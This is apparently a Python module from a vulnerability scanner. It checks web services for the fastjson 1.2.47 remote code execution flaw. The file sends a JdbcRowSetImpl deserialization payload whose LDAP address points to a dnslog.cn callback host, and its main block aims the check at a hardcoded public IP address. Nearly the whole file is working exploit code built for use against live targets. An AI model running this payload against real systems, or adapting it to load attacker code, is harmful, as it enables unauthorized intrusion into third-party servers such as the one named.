# coding:utf-8
import requests
import urllib
import re
requests.packages.urllib3.disable_warnings()

class c2Class(object):
	def __init__(self):
		self.vulname = 'fastjson 1.2.47 RCE'
		self.vulsystem= 'fastjson'
		self.vulsystemintro = 'Fastjson 是一个 Java 库,可以将 Java 对象转换为 JSON 格式,当然它也可以将 JSON 字符串转换为 Java 对象。'
		self.vulversion = '<1.2.48'
		self.fofa=''
		self.findtime='2019-08'
		self.cveid=''
		self.refer= 'https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/\nhttps://www.cnblogs.com/zhengjim/p/11433926.html'
		self.testisok=True

		if __file__[-3:]=='pyc':
			self._file=__file__[:-1]
		else:
			self._file=__file__

		self.dnslog='x488lb.dnslog.cn'
		print('Current module use [%s]. You can change dnslog in %s'%(self.dnslog,self._file))

		self.headers = {
		'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
		'Connection': "close",
		'Content-Type': "application/json"}
		self.payload='{"a":"'
		self.flag='com.alibaba.fastjson.JSONException: unclosed string'

		self.rc_host=re.compile('(?<=://).+?(?=[:/])')
		self.payload2='{"name":{"@type":"java.lang.Class", "val":"com.sun.rowset.JdbcRowSetImpl"}, "f":{"@type":"com.sun.rowset.JdbcRowSetImpl", "dataSourceName":"ldap://%s/", "autoCommit":true}}, age:11}'
		self.flag2='set property error'



	def c2Func(self,target):
		status=0
		returnData=''
		if target.startswith(('http://','https://')):
			pass
		else:
			target='http://'+target
		try:
			url=target.strip('/')+'/'
			resp=requests.post(url=url,data=self.payload,headers=self.headers,verify=False,timeout=5)
			# print(url)
			# print(resp.text)
			if self.flag in resp.text:
				host=self.rc_host.search(url).group()
				dnslog='%s.%s'%(host,self.dnslog)
				payload=self.payload2%dnslog
				resp=requests.post(url=url,data=payload,headers=self.headers,verify=False,timeout=5)
				if self.flag2 in resp.text:
					returnData='%s is vuln(%s), u can check dnslog: %s'%(url,self.vulname,dnslog) #
					status=1
				else:
					returnData='%s use %s.u can try to attack it.'%(url,self.vulname) #
					status=1
		except Exception as e:
			returnData=str(e)
		return status,returnData

if __name__ == '__main__':
	target='http://183.62.254.186:8889/'
	pocObj=c2Class()
	print(pocObj.c2Func(target))
